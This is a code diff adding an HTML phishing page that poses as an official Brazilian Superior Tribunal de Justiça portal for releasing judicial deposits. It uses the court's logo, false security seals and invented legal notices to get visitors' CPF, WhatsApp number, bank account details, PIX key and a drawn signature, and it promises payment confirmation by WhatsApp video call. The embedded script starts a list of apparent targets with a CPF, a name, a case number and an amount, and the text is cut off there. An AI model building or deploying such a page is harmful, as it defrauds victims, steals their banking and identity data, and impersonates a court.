@@ -1,0 +1,1455 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STJ - Portal Unificado de Repasse de Depósitos Judiciais</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- ÍCONE OFICIAL RECONHECIDO NATIVAMENTE NA ABA -->
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'><rect width='120' height='120' fill='%23ffffff' rx='16'/><text x='12' y='68' font-family='Arial Black, sans-serif' font-size='44' font-weight='900' fill='%23003399'>STJ</text><line x1='12' y1='80' x2='108' y2='80' stroke='%23FFCC00' stroke-width='6'/></svg>">
+
+    <style>
+        body { font-family: 'Source Sans 3', sans-serif; background-color: #f1f5f9; color: #1e293b; }
+        .hidden { display: none; }
+        
+        /* ASSEGURA AS CORES OFICIAIS DO LOGOTIPO */
+        .logo-oficial-pure .cls-1 { fill: #2f6586 !important; }
+        .logo-oficial-pure .cls-2 { fill: #437857 !important; }
+        .logo-oficial-pure .cls-3 { fill: #fdb515 !important; }
+        .logo-oficial-pure .cls-4 { fill: #ffd07b !important; }
+        .logo-oficial-pure .cls-5 { fill: #003c5f !important; }
+        .logo-oficial-pure .cls-6 { fill: #004c23 !important; }
+        .logo-oficial-pure .cls-1, .logo-oficial-pure .cls-2, .logo-oficial-pure .cls-3, .logo-oficial-pure .cls-4, .logo-oficial-pure .cls-5, .logo-oficial-pure .cls-6 { stroke-width: 0px; }
+
+        @keyframes piscar-suave { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        .cadeado-animado { animation: piscar-suave 3s infinite ease-in-out; display: inline-block; }
+
+        @keyframes pulse-liberado {
+            0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(34, 197, 94, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
+        }
+        .badge-liberado { animation: pulse-liberado 2s infinite; background-color: #16a34a; color: white; font-weight: 800; }
+        .process-card-liberado { border: 3px solid #16a34a !important; background-color: #f0fdf4 !important; }
+        canvas { border: 2px solid #cbd5e1; border-radius: 1rem; background: #ffffff; touch-action: none; width: 100%; height: 140px; }
+        .animate-fade { animation: fadeIn 0.4s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .process-card { border: 2px solid #cbd5e1; transition: all 0.3s; cursor: pointer; border-radius: 1.5rem; background: white; }
+
+        @page { size: A4 portrait; margin: 5mm 8mm; }
+        @media print {
+            body, html { background: white !important; color: black !important; width: 100% !important; height: 100% !important; margin: 0 !important; padding: 0 !important; overflow: hidden !important; }
+            #interface-completa { display: none !important; }
+            #documento-pdf { display: block !important; visibility: visible !important; position: absolute !important; left: 0 !important; top: 0 !important; width: 100% !important; box-shadow: none !important; padding: 0 !important; margin: 0 !important; page-break-inside: avoid !important; }
+            #documento-pdf * { visibility: visible !important; color: black !important; }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <div id="interface-completa" class="flex flex-col min-h-screen">
+        
+        <!-- HEADER INSTITUCIONAL ENQUADRADO -->
+        <header class="bg-white pt-8 pb-4 px-4 text-center shadow-sm border-b border-slate-200">
+            <div class="flex flex-col items-center gap-4 max-w-xl mx-auto">
+                
+                <!-- LOGO DO STJ EXPANDIDA NA LARGURA EXATA DO FORMULÁRIO -->
+                <div class="w-full flex items-center justify-center px-1">
+                    <svg class="logo-oficial-pure w-full max-w-[440px] h-auto" viewBox="0 0 565.43 97.28" xmlns="http://www.w3.org/2000/svg">
+                        <g id="todas_as_versões">
+                            <path class="cls-5" d="m505.4,12.16c-12.43,0-21.52,9.39-21.52,21.43s9.09,21.96,21.52,21.96,21.52-9.63,21.52-21.96-9.09-21.43-21.52-21.43Zm0,34c-6.16,0-11.1-5.4-11.1-12.57s4.95-12.04,11.1-12.04,11.1,5.17,11.1,12.04-4.94,12.57-11.1,12.57Z"/>
+                            <path class="cls-5" d="m290.33,41.04l-6.02,7.72s7.15,6.79,17.48,6.79,15.5-6.11,15.5-13.16c0-12.66-20.07-12.46-20.07-17.79,0-2.69,3.06-3.51,5.27-3.51,5.29,0,9.58,2.57,9.58,2.57l4.3-8.08s-5.17-3.85-14.1-3.85-15.56,5.16-15.56,12.98c0,13.05,19.81,12.38,19.81,17.91,0,2.55-2.4,3.38-4.62,3.38-5.54,0-11.59-4.96-11.59-4.96Z"/>
+                            <path class="cls-5" d="m321.25,39.4c0,9.45,6.2,16.15,16.88,16.15s16.76-6.7,16.76-16.15V12.86h-10.27v26.54c0,4.4-2.15,6.75-6.55,6.75s-6.56-2.35-6.56-6.75V12.86h-10.27v26.54Z"/>
+                            <path class="cls-5" d="m379.55,12.86h-18.15v41.99h10.27v-11.9h7.88c8.16,0,13.85-6.65,13.85-15.11s-5.7-14.98-13.85-14.98Zm-2.11,21.28h-5.77v-12.47h5.95c3.4,0,5.34,2.83,5.34,6.17s-1.94,6.3-5.52,6.3Z"/>
+                            <polygon class="cls-5" points="407.89 46.03 407.89 38.11 419.95 38.11 419.95 29.3 407.89 29.3 407.89 21.67 423.9 21.67 423.9 12.86 397.62 12.86 397.62 54.84 424.72 54.84 424.72 46.03 407.89 46.03"/>
+                            <path class="cls-5" d="m463.95,54.84l-7.89-14.58c4.13-2.48,6.69-7.14,6.69-12.8,0-8.45-5.7-14.6-13.85-14.6h-18.15v41.99h10.27v-12.66h5.71l6.16,12.66h11.08Zm-22.94-33.17h5.95c3.4,0,5.34,2.45,5.34,5.79s-1.94,5.91-5.52,5.91h-5.77v-11.71Z"/>
+                            <path class="cls-5" d="m565.43,54.84l-7.89-14.58c4.13-2.48,6.69-7.14,6.69-12.8,0-8.45-5.7-14.6-13.85-14.6h-18.15v41.99h10.27v-12.66h5.71l6.16,12.66h11.08Zm-22.94-33.17h5.95c3.4,0,5.34,2.45,5.34,5.79s-1.94,5.91-5.52,5.91h-5.77v-11.71Z"/>
+                            <rect class="cls-5" x="468.43" y="12.86" width="10.27" height="41.98"/>
+                            <path class="cls-5" d="m289.73,68.22h-5.42v-3.01h14.1v3.01h-5.22v16.22h-3.46v-16.22Z"/>
+                            <path class="cls-5" d="m512.12,68.22h-5.26v-3.01h13.96v3.01h-5.24v16.22h-3.46v-16.22Z"/>
+                            <path class="cls-5" d="m301.25,65.21h6.14c2.06,0,3,.16,3.83.54,1.9.87,3.11,2.71,3.11,5.25,0,2.3-1.21,4.45-3.22,5.26v.05s.27.28.64.95l3.91,7.18h-3.86l-3.78-7.18h-3.32v7.18h-3.46v-19.23Zm6.56,9.02c1.85,0,3-1.11,3-3.04s-.78-2.98-3.48-2.98h-2.63v6.01h3.11Z"/>
+                            <path class="cls-5" d="m318.56,65.21h3.46v19.23h-3.46v-19.23Z"/>
+                            <path class="cls-5" d="m326.62,65.21h6.81c3.43,0,5.87,1.79,5.87,4.96,0,1.79-.86,3.33-2.3,4.12v.05c2.09.62,3.08,2.57,3.08,4.52,0,3.85-3.05,5.58-6.57,5.58h-6.89v-19.23Zm6.81,7.85c1.5,0,2.36-1.08,2.36-2.46s-.8-2.38-2.41-2.38h-3.3v4.85h3.35Zm.35,8.37c1.77,0,2.76-1.16,2.76-2.79s-1.02-2.76-2.76-2.76h-3.7v5.55h3.7Z"/>
+                            <path class="cls-5" d="m343.3,65.21h3.46v12.32c0,2.58,1.02,4.04,3.56,4.04s3.59-1.46,3.59-4.06v-12.3h3.46v12.32c0,4.31-2.44,7.23-7.02,7.23s-7.05-2.93-7.05-7.23v-12.32Z"/>
+                            <path class="cls-5" d="m361.46,65.21h3.46l7.21,11.1c.72,1.11,1.58,2.98,1.58,2.98h.05s-.19-1.84-.19-2.98v-11.1h3.43v19.23h-3.43l-7.21-11.08c-.72-1.11-1.58-2.98-1.58-2.98h-.05s.19,1.84.19,2.98v11.08h-3.46v-19.23Z"/>
+                            <path class="cls-5" d="m391.04,79.9h-6.97l-1.45,4.55h-3.56l6.7-19.23h3.62l6.7,19.23h-3.57l-1.47-4.55Zm-3.48-11.35s-.43,1.9-.8,2.98l-1.85,5.53h5.28l-1.82-5.53c-.35-1.08-.75-2.98-.75-2.98h-.05Z"/>
+                            <path class="cls-5" d="m560.39,79.9h-6.97l-1.45,4.55h-3.56l6.7-19.23h3.62l6.7,19.23h-3.57l-1.47-4.55Zm-3.48-11.35s-.43,1.9-.8,2.98l-1.85,5.53h5.28l-1.82-5.53c-.35-1.08-.75-2.98-.75-2.98h-.05Z"/>
+                            <path class="cls-5" d="m398.14,65.21h3.46v16.22h7.86v3.01h-11.32v-19.23Z"/>
+                            <path class="cls-5" d="m419.98,65.21h5.88c5.87,0,9.7,3.52,9.7,9.59s-3.83,9.64-9.7,9.64h-5.88v-19.23Zm5.69,16.22c3.86,0,6.33-2.3,6.33-6.63s-2.52-6.58-6.33-6.58h-2.24v13.22h2.24Z"/>
+                            <path class="cls-5" d="m438.52,65.21h11.39v3.01h-7.93v5.04h6.4v3h-6.4v5.17h8.36v3.01h-11.82v-19.23Z"/>
+                            <path class="cls-5" d="m459.58,77.65h3.43v.89c0,2.27,1.23,3.03,2.52,3.03s2.44-.79,2.44-2.87v-10.48h-2.67v-3.01h6.13v13.54c0,4.2-3,6.01-5.95,6.01s-5.9-1.87-5.9-6.01v-1.11Z"/>
+                            <path class="cls-5" d="m475.39,65.21h3.46v12.32c0,2.58,1.02,4.04,3.56,4.04s3.59-1.46,3.59-4.06v-12.3h3.46v12.32c0,4.31-2.44,7.23-7.02,7.23s-7.05-2.93-7.05-7.23v-12.32Z"/>
+                            <path class="cls-5" d="m494.29,79.44s2.22,2.1,4.9,2.1c1.45,0,2.76-.76,2.76-2.33,0-3.44-8.98-2.85-8.98-8.75,0-3.19,2.73-5.58,6.38-5.58,3.28,0,5.22,1.75,5.22,1.75l-1.42,2.68s-1.67-1.21-3.82-1.21c-1.61,0-2.87.95-2.87,2.3,0,3.41,8.95,2.57,8.95,8.72,0,3.06-2.3,5.63-6.27,5.63-4.23,0-6.87-2.84-6.87-2.84l2.03-2.49Z"/>
+                            <path class="cls-5" d="m523.98,65.21h3.46v19.23h-3.46v-19.23Z"/>
+                            <path class="cls-5" d="m540.08,64.89c4.63,0,7.02,2.62,7.02,2.62l-1.66,2.6s-2.17-2.03-5.20-2.03c-4.02,0-6.13,3.03-6.13,6.61s2.2,6.88,6.16,6.88c3.3,0,5.52-2.44,5.52-2.44l1.82,2.52s-2.46,2.9-6.99,3.09l-.19.89c1.1.14,1.96.79,1.96,2.06,0,1.79-1.33,2.32-2.78,2.32-.91,0-1.56-.29-1.56-.29v-1.52s.37.09.96.09c.64,0,1.18-.28,1.18-.84,0-.52-.56-.73-1.29-.73-.3,0-.56.05-.56.05l.56-2.09c-5.14-.54-8.36-4.68-8.36-9.94,0-5.58,3.94-9.86,9.54-9.86Z"/>
+                            <path class="cls-3" d="m36.05,52.63c0,18.06-8.38,34.16-21.45,44.65h-.87c-7.55,0-13.73-6.18-13.73-13.73V0h1.28c20.44,8.72,34.77,29,34.77,52.63h0Z"/>
+                            <path class="cls-4" d="m22.63,0c10.97,11.79,17.68,27.59,17.68,44.97,0,21.16-9.95,39.99-25.44,52.08,12.92-10.49,21.18-26.48,21.18-44.42C36.05,29.01,21.71,8.73,1.27,0h21.36Z"/>
+                            <path class="cls-5" d="m76.46,58.11c2.82-7.53,4.37-15.69,4.37-24.2,0-12.32-3.24-23.89-8.9-33.91h11.62c7.55,0,13.73,6.18,13.73,13.73v81.56l-20.82-37.18Z"/>
+                            <path class="cls-6" d="m75.15,61.35c-6.98,16.09-19.93,28.99-36.04,35.93h56.17l-20.12-35.93Z"/>
+                            <path class="cls-1" d="m76.46,58.11c2.82-7.53,4.37-15.68,4.37-24.2,0-12.32-3.24-23.89-8.9-33.91h-28l32.54,58.11Z"/>
+                            <path class="cls-2" d="m40.8,0h-14.48c10.42,12.06,16.72,27.78,16.72,44.97,0,20.93-9.34,39.68-24.08,52.3h20.15c16.12-6.94,29.06-19.84,36.04-35.93L40.8,0Z"/>
+                            <path class="cls-5" d="m258.42,12.85h-31.83v10.76h18.87v34.49c0,11.82-3.72,14.77-11.09,14.77h-15.74v11.57h16.26c14.01,0,23.52-6.48,23.52-25.93V12.85Z"/>
+                            <polygon class="cls-5" points="197.21 23.61 218.64 23.61 218.64 12.85 162.95 12.85 162.95 23.61 184.26 23.61 184.26 84.44 197.21 84.44 197.21 23.61"/>
+                            <path class="cls-5" d="m136.41,30.72c0-3.57,2.08-7.12,9.75-7.12,6.64,0,8.83.01,8.83.01v-10.76h-8.57c-14.88,0-23.18,7.52-23.18,19.12,0,10.14,7.48,16.3,19.28,20.48,8.95,3.24,12.54,6.38,12.54,11.71s-3.91,8.71-11.5,8.71h-20.38v11.58h18.19c18.22,0,26.86-9.83,26.86-21.22,0-10.14-5.9-16.31-18.22-20.9-9.48-3.66-13.58-6.17-13.58-11.6h0Z"/>
+                        </g>
+                    </svg>
+                </div>
+                <div>
+                    <h2 class="text-[13px] font-extrabold tracking-wider text-slate-700 uppercase leading-none">
+                        COORDENADORIA DE PAGAMENTO DE PRECATÓRIOS E ATIVOS
+                    </h2>
+                </div>
+                <div class="bg-green-700 text-white py-1.5 px-4 rounded-xl shadow-sm inline-flex items-center justify-center gap-2 max-w-max mx-auto">
+                    <span class="text-xs cadeado-animado">🔒</span>
+                    <div class="text-left leading-tight">
+                        <span class="text-[9.5px] font-black tracking-wider uppercase text-white">AMBIENTE SEGURO E CRIPTOGRAFADO (SSL) —</span>
+                        <span class="text-[8.5px] text-green-100 font-bold uppercase tracking-wide ml-0.5">SISTEMA DE LIQUIDAÇÃO COM AUDITORIA ATIVA</span>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN CONTAINER -->
+        <main class="flex-1 max-w-xl w-full mx-auto p-4 pt-6 pb-10">
+            <div id="painel-principal" class="bg-white rounded-[3rem] shadow-2xl p-8 md:p-12 border border-gray-200 relative overflow-hidden">
+                
+                <!-- ETAPA 1: RASTREAMENTO -->
+                <div id="step-cpf" class="space-y-8">
+                    <div class="text-center space-y-3">
+                        <h2 class="text-2xl font-bold text-slate-800">Consulta Unificada de Ativos Processuais</h2>
+                        <p class="text-slate-500 font-medium text-sm">Pesquisa integrada de ordens de pagamento, alvarás e mandados de repasse financeiros.</p>
+                    </div>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-xs font-black text-slate-400 ml-1 uppercase tracking-widest">Inscrição CPF do Requerente</label>
+                            <input type="text" id="cpf_input" inputmode="tel" placeholder="000.000.000-00" maxlength="14" class="w-full p-5 rounded-2xl border border-slate-300 outline-none text-2xl font-bold bg-slate-50 focus:border-blue-900 transition-all text-center">
+                        </div>
+                        <div class="bg-blue-50 border border-blue-200 rounded-2xl p-4 flex items-start gap-3 shadow-sm">
+                            <div class="text-lg mt-0.5">🛡️</div>
+                            <div class="text-left space-y-1">
+                                <p class="text-[11px] font-black text-blue-900 uppercase tracking-wide leading-none">Segurança e Proteção dos Dados (LGPD)</p>
+                                <p class="text-[10px] text-slate-600 font-medium leading-relaxed">
+                                    Os dados coletados destinam-se exclusivamente à localização de depósitos judiciais. A consulta é sigilosa, criptografada ponta a ponta e totalmente em conformidade com as diretrizes da Lei Geral de Proteção de Dados.
+                                </p>
+                            </div>
+                        </div>
+                        <div id="error_container" class="hidden bg-red-50 border-l-4 border-red-600 p-4 rounded-r-xl mt-4">
+                            <p id="error_msg" class="text-red-800 text-xs font-bold leading-relaxed text-center"></p>
+                        </div>
+                    </div>
+                    <div id="loading" class="hidden flex flex-col items-center py-8 space-y-4">
+                        <div class="w-12 h-12 border-4 border-blue-900 border-t-green-500 rounded-full animate-spin"></div>
+                        <p class="text-sm font-black text-blue-900 uppercase tracking-widest text-center">Efetuando varredura na base de dados de depósitos judiciais...</p>
+                    </div>
+                </div>
+
+                <!-- ETAPA 2: CARD RESULTADO -->
+                <div id="step-result" class="hidden space-y-8 animate-fade">
+                    <div class="flex justify-between items-center border-b border-slate-100 pb-5">
+                        <h3 class="text-xs font-black text-slate-400 uppercase tracking-widest">Crédito Localizado</h3>
+                        <div id="hoje-label" class="text-xs font-black text-blue-900 bg-blue-100 px-4 py-2 rounded-xl"></div>
+                    </div>
+                    <div class="bg-slate-50 p-6 rounded-[2rem] border border-slate-200 shadow-sm">
+                        <p class="text-[10px] font-black text-slate-400 uppercase mb-2 tracking-widest">Titular Legítimo do Direito</p>
+                        <p class="text-xl font-extrabold text-slate-800 uppercase leading-tight" id="res-nome"></p>
+                        <p class="text-sm text-blue-800 font-bold mt-1" id="res-cpf-label"></p>
+                    </div>
+                    <div id="process-list" class="space-y-6"></div>
+                    <button type="button" id="confirm-btn" class="w-full py-6 bg-blue-900 text-white font-black rounded-2xl shadow-2xl uppercase tracking-[0.15em] text-sm hover:scale-[1.02] active:scale-95 transition-all">
+                        Iniciar Agendamento Eletrônico da Audiência
+                    </button>
+                </div>
+
+                <!-- ETAPA 3: FORMULÁRIO -->
+                <form id="stjForm" class="hidden space-y-10 animate-fade">
+                    <div class="space-y-5">
+                        <h3 class="text-sm font-black text-slate-800 uppercase tracking-[0.15em] border-b pb-3">1. Agendamento Eletrônico de Audiência de Verificação</h3>
+                        <div class="space-y-4">
+                            <div>
+                                <label class="text-[11px] font-bold text-slate-400 uppercase">Canal de Comunicação Vinculado (WhatsApp)</label>
+                                <input type="text" id="telefone" inputmode="tel" placeholder="(00) 00000-0000" maxlength="15" required class="w-full p-4 mt-1 rounded-xl border border-slate-300 outline-none bg-slate-50 text-xl font-bold text-slate-700">
+                            </div>
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div>
+                                    <label class="text-[11px] font-bold text-slate-400 uppercase">Data do Agendamento</label>
+                                    <select id="data_audiencia" required class="w-full p-4 mt-1 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold text-slate-700"></select>
+                                </div>
+                                <div>
+                                    <label class="text-[11px] font-bold text-slate-400 uppercase">Janela Cronológica (Horário)</label>
+                                    <select id="horario" required class="w-full p-4 mt-1 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold text-slate-700">
+                                        <option value="">Escolha o Horário</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <!-- INFORMATIVO PROFISSIONAL -->
+                            <div class="bg-blue-50 border border-blue-200 text-blue-900 p-4 rounded-xl text-[11px] font-semibold leading-relaxed flex items-start gap-2.5 shadow-sm mt-3">
+                                <span class="text-sm mt-0.5">ℹ️</span>
+                                <p>
+                                    <strong>Termo de Responsabilidade Coletiva:</strong> Devido à alta demanda processual da mesa unificada, as janelas de pauta são rigorosamente cronometradas. O não comparecimento na janela aprazada acarretará o cancelamento automático do presente protocolo financeiro, exigindo nova reabertura de requerimento com retorno ao final da fila de espera regulamentar do Tribunal.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-5">
+                        <h3 class="text-sm font-black text-slate-800 uppercase tracking-[0.15em] border-b pb-3">2. Conta de Destino para Liquidação Financeira</h3>
+                        <div class="bg-amber-50 border-l-4 border-amber-500 p-4 rounded-r-xl text-xs font-bold text-amber-950 leading-relaxed">
+                            ⚠️ RESTRIÇÃO COMPULSÓRIA: A conta bancária indicada abaixo deve obrigatoriamente ter como titular o próprio beneficiário da ação: <span class="underline uppercase font-extrabold" id="titular-aviso"></span>. Não serão aceitas contas de terceiros.
+                        </div>
+                        <div class="space-y-4">
+                            <select id="banco" required class="w-full p-4 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold text-slate-700">
+                                <option value="">Selecione a Instituição Financeira</option>
+                                <option>001 - Banco do Brasil S.A.</option>
+                                <option>104 - Caixa Econômica Federal</option>
+                                <option>341 - Itaú Unibanco S.A.</option>
+                                <option>237 - Banco Bradesco S.A.</option>
+                                <option>033 - Banco Santander Brasil</option>
+                                <option>260 - NuPagamentos (Nubank)</option>
+                                <option>077 - Banco Inter S.A.</option>
+                                <option>748 - Sicredi S.A.</option>
+                                <option value="OUTRO">000 - Outra Instituição (Digitar)</option>
+                            </select>
+                            <div id="campo_banco_outro" class="hidden animate-fade">
+                                <label class="text-[11px] font-bold text-slate-400 uppercase">Nome / Código da Instituição Bancária</label>
+                                <input type="text" id="banco_outro_nome" placeholder="Ex: Banco C6 S.A." class="w-full p-4 mt-1 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold">
+                            </div>
+                            <div class="grid grid-cols-2 gap-4">
+                                <input type="text" id="agencia" inputmode="tel" placeholder="Agência" required class="w-full p-4 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold">
+                                <input type="text" id="conta" inputmode="tel" placeholder="Conta com Dígito" required class="w-full p-4 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold">
+                            </div>
+                            <div>
+                                <input type="text" id="pix" placeholder="Chave Cadastral PIX (Opcional)" class="w-full p-4 rounded-xl border border-slate-300 outline-none bg-slate-50 font-bold">
+                                <p class="text-[11px] font-semibold text-amber-700 bg-amber-50 p-3 rounded-xl border border-amber-200 mt-2 leading-relaxed">
+                                    ℹ️ <strong>Informativo Tributário:</strong> Liquidações de depósitos judiciais processadas via TED (Transferência Eletrônica Disponível) passam por auditoria eletrônica compulsória na mesa de operações cambiais do Tribunal e podem levar até 24 horas úteis para efetiva compensação na conta de destino.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="space-y-4">
+                        <label class="text-xs font-black text-slate-500 uppercase tracking-widest border-l-4 border-blue-900 pl-3">3. Subscrição e Assinatura Eletrônica do Termo:</label>
+                        <canvas id="canvas" width="500" height="150"></canvas>
+                        <button type="button" id="clear" class="text-xs font-extrabold text-red-600 uppercase">❌ Limpar tela de desenho</button>
+                    </div>
+
+                    <div class="flex items-center justify-center gap-6 py-2 border-t border-b border-slate-100 my-4 text-[9px] font-bold text-slate-400 uppercase tracking-wider text-center">
+                        <div>🔒 CERTIFICADO ICP-BRASIL</div>
+                        <div>🛡️ PROTEÇÃO LGPDP</div>
+                        <div>🏛️ AUDITADO STJ</div>
+                    </div>
+                    <button type="submit" class="w-full py-6 bg-green-600 text-white font-black rounded-3xl shadow-2xl uppercase tracking-[0.2em] text-base hover:bg-green-700 transition-all">
+                        Subscrever Termo e Emitir Certidão
+                    </button>
+                </form>
+
+                <!-- PROCESSAMENTO SERVIDOR -->
+                <div id="step-loading-server" class="hidden flex flex-col items-center py-12 space-y-6 animate-fade">
+                    <div class="w-16 h-16 border-4 border-blue-900 border-t-green-500 rounded-full animate-spin"></div>
+                    <div class="space-y-2 text-center">
+                        <p id="loading-server-title" class="text-sm font-black text-blue-900 uppercase tracking-widest"></p>
+                        <p class="text-xs text-slate-400 font-medium">Por favor, mantenha o aplicativo aberto. Processando requisição...</p>
+                    </div>
+                </div>
+
+                <!-- TELA DE SUCESSO -->
+                <div id="step-success" class="hidden space-y-6 text-center animate-fade py-6">
+                    <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto text-4xl shadow-md">✓</div>
+                    <h2 class="text-2xl font-black text-slate-800">Agendamento Homologado!</h2>
+                    <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-left max-w-md mx-auto text-xs space-y-2 text-slate-700">
+                        <p>🆔 <strong>Chave de Autenticação:</strong> <span id="sucesso-id" class="font-bold text-blue-900"></span></p>
+                        <p>📅 <strong>Data/Hora do Registro:</strong> <span id="sucesso-data-feito" class="font-bold text-slate-900"></span></p>
+                        <p>⏰ <strong>Aprazamento da Audiência:</strong> <span id="sucesso-horario" class="font-bold text-amber-700"></span></p>
+                    </div>
+                    <p class="text-slate-600 text-sm leading-relaxed max-w-md mx-auto">
+                        A certidão contendo o sumário completo e as chaves de segurança criptográficas foi gerada com sucesso para salvamento.
+                    </p>
+                    <div class="bg-blue-50 border border-blue-200 text-blue-900 p-5 rounded-2xl text-xs font-bold uppercase tracking-wider space-y-2">
+                        <p class="text-slate-700 font-medium normal-case leading-relaxed text-center">
+                            A conferência formal de dados e a respectiva homologação de repasse de valores serão realizadas estritamente por videochamada corporativa via **WhatsApp**. Favor aguardar o envio do link de acesso.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer class="py-10 text-center text-slate-400 text-[9px] uppercase tracking-widest leading-loose">
+            <p>© 2026 SUPERIOR TRIBUNAL DE JUSTIÇA<br>TODOS OS DIREITOS RESERVADOS</p>
+        </footer>
+    </div>
+
+    <!-- DOCUMENTO PDF OCULTO -->
+    <div id="documento-pdf" class="hidden p-2 bg-white text-black" style="width: 100%; font-family: Arial, sans-serif; max-height: 100vh; box-sizing: border-box;">
+        <table style="width: 100%; border-collapse: collapse; border-bottom: 3px solid #003399; margin-bottom: 10px; padding-bottom: 8px;">
+            <tr>
+                <td style="width: 75px; vertical-align: middle; padding-bottom: 6px;">
+                    <svg width="65" height="65" viewBox="0 0 110 110" xmlns="http://www.w3.org/2000/svg" style="display: block;">
+                        <rect width="110" height="110" fill="#ffffff" rx="8"/>
+                        <text x="5" y="60" font-family="'Arial Black', Gadget, sans-serif" font-size="46" font-weight="900" fill="#003399">STJ</text>
+                        <line x1="5" y1="72" x2="105" y2="72" stroke="#FFCC00" stroke-width="5" />
+                    </svg>
+                </td>
+                <td style="vertical-align: middle; text-align: left; padding-left: 10px; padding-bottom: 6px;">
+                    <h1 style="font-size: 16px; font-weight: 900; margin: 0; color: #003399; font-family: Arial, sans-serif;">SUPERIOR TRIBUNAL DE JUSTIÇA</h1>
+                    <p style="font-size: 8.5px; font-weight: bold; margin: 2px 0 0 0; color: #b45309; letter-spacing: 0.5px;">SECRETARIA UNIFICADA DE CONCILIAÇÃO E REPASSE DE ATIVOS</p>
+                </td>
+            </tr>
+        </table>
+        
+        <div style="background: #f8fafc; border: 1px solid #cbd5e1; padding: 12px; border-radius: 8px; font-size: 11.5px; line-height: 1.45; font-family: monospace; margin-bottom: 10px;">
+            <p style="margin: 0 0 8px 0; font-size: 12px; font-weight: bold; border-bottom: 1px solid #cbd5e1; padding-bottom: 5px; color: #003399; text-align: center; letter-spacing: 0.5px;">🏛️ CERTIDÃO DE AUDIÊNCIA VIRTUAL DE CONFORMIDADE JURÍDICA</p>
+            <div id="pdf-conteudo-texto" style="white-space: pre-wrap; color: black;"></div>
+        </div>
+
+        <table style="width: 100%; border-collapse: collapse; border-top: 1px dashed #000000; margin-top: 5px; padding-top: 5px;">
+            <tr>
+                <td style="width: 50%; text-align: center; vertical-align: top; padding-top: 5px;">
+                    <p style="font-size: 8.5px; margin: 0 0 3px 0; font-weight: bold; color: black; text-transform: uppercase;">Assinatura Eletrônica do Requerente:</p>
+                    <img id="pdf-assinatura-img" src="" style="max-height: 42px; border-bottom: 1px solid #000; display: inline-block;" alt="Assinatura">
+                    <p style="font-size: 9px; font-weight: bold; margin: 3px 0 0 0; text-transform: uppercase; color: black;" id="pdf-nome-sub"></p>
+                </td>
+                <td style="width: 50%; text-align: right; vertical-align: top; padding-top: 5px; border-left: 1px dotted #cbd5e1; padding-left: 10px;">
+                    <p style="font-size: 8.5px; margin: 0 0 2px 0; font-weight: bold; color: #1e3a8a; text-transform: uppercase;">🔒 VALIDAÇÃO E AUTENTICIDADE ELETRÔNICA</p>
+                    <p style="font-size: 8px; color: #334155; margin: 0 0 4px 0; font-family: monospace; line-height: 1.2; text-align: right;">Hash de Segurança:<br><span id="pdf-hash-seguranca" style="font-weight: bold; color: black; font-size: 8.5px;"></span></p>
+                    <svg width="140" height="16" viewBox="0 0 140 16" xmlns="http://www.w3.org/2000/svg" style="display: inline-block; margin-bottom: 2px;"><rect x="0" width="3" height="16" fill="#000"/><rect x='5' width='1' height='16' fill='#000'/><rect x='8' width='2' height='16' fill='#000'/><rect x='13' width='4' height='16' fill='#000'/><rect x='19' width='1' height='16' fill='#000'/><rect x='22' width='3' height='16' fill='#000'/><rect x='27' width='2' height='16' fill='#000'/><rect x='32' width='4' height='16' fill='#000'/><rect x='38' width='1' height='16' fill='#000'/><rect x='42' width='3' height='16' fill='#000'/><rect x='48' width='2' height='16' fill='#000'/><rect x='52' width='4' height='16' fill='#000'/><rect x='58' width='1' height='16' fill='#000'/><rect x='62' width='3' height='16' fill='#000'/><rect x='67' width='2' height='16' fill='#000'/><rect x='72' width='4' height='16' fill='#000'/><rect x='78' width='1' height='16' fill='#000'/><rect x='82' width='3' height='16' fill='#000'/><rect x='87' width='2' height='16' fill='#000'/><rect x='92' width='4' height='16' fill='#000'/><rect x='98' width='1' height='16' fill='#000'/><rect x='102' width='3' height='16' fill='#000'/><rect x='107' width='2' height='16' fill='#000'/><rect x='112' width='4' height='16' fill='#000'/><rect x='118' width='1' height='16' fill='#000'/><rect x='122' width='3' height='16' fill='#000'/><rect x='127' width='2' height='16' fill='#000'/><rect x='132' width='5' height='16' fill='#000'/></svg>
+                    <p style="font-size: 7.5px; color: #475569; margin: 0; text-align: right; font-weight: 500;">Documento eletrônico assinado e auditado conforme diretrizes regulamentares da mesa de operações unificada do STJ.</p>
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    <script>
+        // LEITURA DO BANCO DE DADOS INTEGRADO (FÁCIL DE EDITAR MANUALMENTE)
+        const DADOS_PLANILHA = [
+    {
+        "cpf_cliente": "58075631668",
+        "nome_cliente": "GEMINOS CARDOSO PEREIRA",
+        "numero_processo": "5000388-08.2025.8.13.0710",
+        "valor_processo": "R$ 70.000,00",
+        "polo_passivo": "N/A",
